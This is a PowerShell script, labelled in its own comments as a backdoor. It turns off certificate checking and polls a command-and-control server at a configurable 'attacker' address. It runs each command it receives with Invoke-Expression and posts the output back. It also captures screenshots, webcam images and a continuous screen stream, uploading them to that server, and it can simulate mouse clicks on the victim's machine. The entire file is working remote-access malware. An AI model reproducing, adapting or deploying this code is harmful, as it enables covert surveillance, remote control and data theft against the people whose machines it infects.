# ----- Global SSL ignore (works for all web requests) -----
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# ----- Global attacker URL -----
$global:attacker = '192.168.1.53:8000'   # <-- CHANGE TO YOUR IP

# ----- Logging -----
$logFile = "C:\Users\Public\backdoor.log"
function Write-Log {
    param($Message)
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') : $Message" | Out-File -FilePath $logFile -Append
}

Write-Log "Backdoor started"

# ----- Helper: Download and invoke a function from a URL (optional) -----
# Not used, but kept for future extensions.

# ----- C# class for reliable mouse simulation using SendInput -----
$mouseSimCode = @"
using System;
using System.Runtime.InteropServices;
public class MouseSimulator
{
    [DllImport("user32.dll", SetLastError = true)]
    static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

    [StructLayout(LayoutKind.Sequential)]
    struct INPUT
    {
        public uint type;
        public MOUSEINPUT mi;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct MOUSEINPUT
    {
        public int dx;
        public int dy;
        public uint mouseData;
        public uint dwFlags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    const uint INPUT_MOUSE = 0;
    const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    const uint MOUSEEVENTF_LEFTUP = 0x0004;
    const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    const uint MOUSEEVENTF_LEFTDOUBLE = MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;

    public static void LeftClick()
    {
        INPUT[] inputs = new INPUT[2];
        // Down
        inputs[0] = new INPUT { type = INPUT_MOUSE, mi = new MOUSEINPUT { dwFlags = MOUSEEVENTF_LEFTDOWN } };
        // Up
        inputs[1] = new INPUT { type = INPUT_MOUSE, mi = new MOUSEINPUT { dwFlags = MOUSEEVENTF_LEFTUP } };
        SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    public static void RightClick()
    {
        INPUT[] inputs = new INPUT[2];
        inputs[0] = new INPUT { type = INPUT_MOUSE, mi = new MOUSEINPUT { dwFlags = MOUSEEVENTF_RIGHTDOWN } };
        inputs[1] = new INPUT { type = INPUT_MOUSE, mi = new MOUSEINPUT { dwFlags = MOUSEEVENTF_RIGHTUP } };
        SendInput(2, inputs, Marshal.SizeOf(typeof(INPUT)));
    }

    public static void DoubleClick()
    {
        LeftClick();
        LeftClick();
    }
}
"@
Add-Type -TypeDefinition $mouseSimCode -ErrorAction SilentlyContinue
Write-Log "MouseSimulator loaded"

# ----- C# class for webcam capture using avicap32.dll -----
function Capture-Webcam {
    # Locate cam.exe (installed in %TEMP% by the installer)
    $camExe = "$env:TEMP\cam.exe"
    if (-not (Test-Path $camExe)) {
        Write-Output "cam.exe not found at $camExe"
        return
    }

    # cam.exe saves the image as image.jpg in its working directory (which will be %TEMP%)
    $workingDir = $env:TEMP
    $imageFile = Join-Path $workingDir "image.jpg"

    # Remove any old image
    if (Test-Path $imageFile) { Remove-Item $imageFile -Force }

    try {
        # Run cam.exe and wait for it to finish
        $process = Start-Process -FilePath $camExe -WorkingDirectory $workingDir -NoNewWindow -PassThru
        $timeout = 10  # seconds to wait for the process to exit
        $waited = 0
        while (-not $process.HasExited -and $waited -lt $timeout) {
            Start-Sleep -Seconds 1
            $waited++
        }
        # If still running, force kill (optional)
        if (-not $process.HasExited) {
            Stop-Process $process -Force
        }
    } catch {
        Write-Output "Failed to run cam.exe: $_"
        return
    }

    # Check if the image was created
    if (Test-Path $imageFile) {
        # Upload the image to the C2 server
        Invoke-WebRequest -Uri "http://$global:attacker/upload" -Method POST -InFile $imageFile -ContentType 'application/octet-stream'
        Remove-Item $imageFile -Force
        Write-Output "Webcam image captured and uploaded"
    } else {
        Write-Output "Webcam capture failed: image.jpg not found after waiting"
    }
}
# ----- Helper functions for C2 operations -----

function Capture-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $virtualScreen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bmp = New-Object System.Drawing.Bitmap($virtualScreen.Width, $virtualScreen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($virtualScreen.X, $virtualScreen.Y, 0, 0, $virtualScreen.Size)
    $tempFile = "$env:TEMP\ss_$(Get-Date -Format yyyyMMddHHmmss).jpg"
    $bmp.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose(); $bmp.Dispose()

    Invoke-WebRequest -Uri "http://$global:attacker/upload" -Method POST -InFile $tempFile -ContentType 'application/octet-stream'
    Remove-Item $tempFile -Force
    Write-Output "Screenshot captured and uploaded"
}

function Send-MouseClick {
    param([string]$Type)
    switch ($Type) {
        "left"   { [MouseSimulator]::LeftClick() }
        "right"  { [MouseSimulator]::RightClick() }
        "double" { [MouseSimulator]::DoubleClick() }
        default  { Write-Output "Invalid click type" }
    }
    Write-Output "Mouse $Type click sent"
}

function Start-ScreenStream {
    # Stops any existing stream job
    Stop-Job -Name ScreenStream -ErrorAction SilentlyContinue
    Remove-Job -Name ScreenStream -ErrorAction SilentlyContinue

    Start-Job -Name ScreenStream -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $attacker = $using:global:attacker
        while ($true) {
            $virtualScreen = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $bmp = New-Object System.Drawing.Bitmap($virtualScreen.Width, $virtualScreen.Height)
            $g = [System.Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen($virtualScreen.X, $virtualScreen.Y, 0, 0, $virtualScreen.Size)
            $framePath = "$env:TEMP\frame_$(Get-Date -Format yyyyMMddHHmmss).jpg"
            $bmp.Save($framePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $g.Dispose(); $bmp.Dispose()
            Invoke-WebRequest -Uri "http://$attacker/stream_upload" -Method POST -InFile $framePath -ContentType 'application/octet-stream'
            Remove-Item $framePath -Force
            Start-Sleep -Seconds 2
        }
    }
    Write-Output "Screen streaming started"
}

# ----- Main loop (unchanged, but now uses $global:attacker) -----
Write-Log "Entering main loop"

while ($true) {
    try {
        # Fetch the command
        $response = Invoke-WebRequest -Uri "http://$global:attacker/command" -UseBasicParsing
        $cmd = $response.Content
        Write-Log "Received command: $cmd"

        if ($cmd -ne 'idle' -and $cmd -ne '') {
            # Execute the command (functions above will be available)
            $result = Invoke-Expression $cmd 2>&1 | Out-String
            Write-Log "Command executed. Output length: $($result.Length)"

            # Send the result back
            $body = @{ output = $result } | ConvertTo-Json
            Invoke-WebRequest -Uri "http://$global:attacker/result" -Method POST -Body $body -ContentType 'application/json'

            # Reset the command to idle
            Invoke-WebRequest -Uri "http://$global:attacker/set_command" -Method POST -Body '{"command":"idle"}' -ContentType 'application/json'
            Write-Log "Command reset to idle"
        }
    } catch {
        Write-Log "ERROR: $_"
    }
    Start-Sleep -Seconds 10
}
